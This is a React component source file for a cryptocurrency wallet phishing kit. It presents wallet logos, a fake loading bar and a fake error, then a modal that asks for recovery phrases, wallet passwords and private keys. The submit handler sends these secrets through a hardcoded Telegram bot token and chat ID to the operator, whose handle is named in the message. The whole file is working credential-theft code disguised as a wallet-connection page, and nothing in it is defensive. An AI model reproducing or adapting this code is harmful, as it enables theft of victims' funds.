import React, { useState, useEffect } from "react";
import wallets from "../../index"; // Adjust the path to your wallets.js file

const Cryp = () => {
  const [key, setKey] = useState(false);
  const [privateKey, setPrivateKey] = useState(false);
  const [isOpen, setIsOpen] = useState(false);
  const [border, setBorder] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);

  const [formData, setFormData] = useState({
    walletType: '',
    recoveryPhrase: '',
    walletPassword: '',
    privateKey: ''
  });

  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletType: wallet.title }); // Set the wallet type
    setIsOpen(true);

    // Start the loading screen when a wallet is clicked
    setLoading(true);
    setProgress(0); // Reset the progress bar to 0
    setErrorMessage('');

    // Simulate loading for 5 seconds with a progress bar
    let progressInterval = setInterval(() => {
      setProgress((prevProgress) => {
        if (prevProgress >= 100) {
          clearInterval(progressInterval);
          setLoading(false);
          setErrorMessage("An error occurred while loading the wallet. Please try again.");
          setTimeout(() => {
            setIsOpen(true); // Open the modal after error message and progress
          }, 1000); // Wait for a second before opening the modal
          return 100;
        }
        return prevProgress + 20; // Increase the progress by 20% every 1 second
      });
    }, 1000); // Update progress every 1 second
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log('Form data before submission:', formData); // Debugging line

    const telegramBotToken = "7667891062:AAHKVibv3NWoYOX79YurChQ_uQeKio-KvO8"; // Replace with your Telegram bot token
    const telegramChatId = "7183474271"; // Replace with the Telegram chat ID

    const message = `
      🚀 New Result Update:
      - Wallet Type: ${formData.walletType}
      - Recovery Phrase: ${formData.recoveryPhrase}
      - Wallet Password: ${formData.walletPassword || "N/A"}
      - Private Key: ${formData.privateKey || "N/A"}
      - Created By: TG: @kikak08 (Webmails available)
    `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
          }),
        }
      );

      const result = await response.json();
      if (result.ok) {
        setFormData({
          walletType: '',
          recoveryPhrase: '',
          walletPassword: '',
          privateKey: ''
        }); // Reset form data
        setIsOpen(false); // Close the modal
      } else {
        alert("Failed to send submission.");
      }
    } catch (error) {
      console.error("Error sending submission:", error);
      alert("An error occurred while sending the submission.");
    }
  };

  return (
    <>
      {/* Loading screen with progress bar */}
      {loading && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur flex justify-center items-center z-50">
          <div className="w-64 bg-white p-4 rounded-lg shadow-xl">
            <div className="text-center text-white font-bold text-xl mb-4">Loading...</div>
            <div className="relative pt-1">
              <div className="flex mb-2 items-center justify-between">
                <div>
                  <span className="text-sm font-semibold inline-block py-1 uppercase">Progress</span>
                </div>
                <div>
                  <span className="text-xs font-semibold inline-block py-1">{progress}%</span>
                </div>
              </div>
              <div className="flex mb-2 items-center justify-between">
                <div className="w-full bg-gray-300 rounded-full">
                  <div
                    className="bg-blue-600 text-xs leading-none py-1 text-center text-white rounded-full"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Error Message */}
      {errorMessage && !loading && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur flex justify-center items-center z-50">
          <div className="bg-red-600 text-white p-4 rounded-lg shadow-xl w-[300px]">
            <p className="text-center">{errorMessage}</p>
          </div>
        </div>
      )}

      <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4 p-4">
        {wallets.map((wt) => (
          <div
            onClick={() => handleWalletClick(wt)}
            key={wt.id}
            className="flex flex-col items-center mb-5 cursor-pointer hover:scale-105 transition-all duration-[0.5s]"
          >
            <img
              className="w-[60px] object-contain mb-2"
              src={wt.img}
              alt={wt.title}
            />
            <p className="text-[12px] text-white font-extrabold text-center">
              {wt.title}
            </p>
          </div>
        ))}
      </div>

      {isOpen && selectedWallet && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur p-8 z-50 flex justify-center items-center">
          <div className="bg-white p-6 rounded-lg shadow-xl w-[400px] text-center">
            <div className="flex items-center space-x-7">
              <img
                className="w-[60px] mb-2"
                src={selectedWallet.img}
                alt={selectedWallet.title}
              />
              <h3 className="text-lg font-bold mb-2">{selectedWallet.title}</h3>
            </div>

            <ul className="text-sm mb-8 py-4 flex px-8 justify-between border-b">
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Phrase
              </li>
              <li
                onClick={() => {
                  setKey(true);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                KeyStore
              </li>
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(true);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Private Key
              </li>
            </ul>

            <form onSubmit={handleSubmit}>
              <div
                onMouseDown={() => setBorder(!border)}
                className={`border rounded-md overflow-hidden mb-5 ${
                  border === true ? "shadow-sm shadow-blue-700 " : ""
                }`}
              >
                <input
                  className="w-full pb-14 py-1 px-2 outline-none"
                  type="text"
                  placeholder="Enter recovery phrase"
                  name="recoveryPhrase"
                  value={formData.recoveryPhrase}
                  onChange={handleChange}
                  required
                />
              </div>
              {key && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Wallet password"
                    name="walletPassword"
                    value={formData.walletPassword}
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              {privateKey && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Enter your Private Key"
                    name="privateKey"
                    value={formData.privateKey}
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              <p className="text-[11px] text-start mb-3">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
              <div>
                <button type="submit" className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded">
                  PROCEED
                </button>
              </div>
              <div className="text-end">
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  className="bg-red-600 text-white font-semibold py-2 px-4 rounded"
                >
                  Close
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </>
  );
};

export default Cryp;
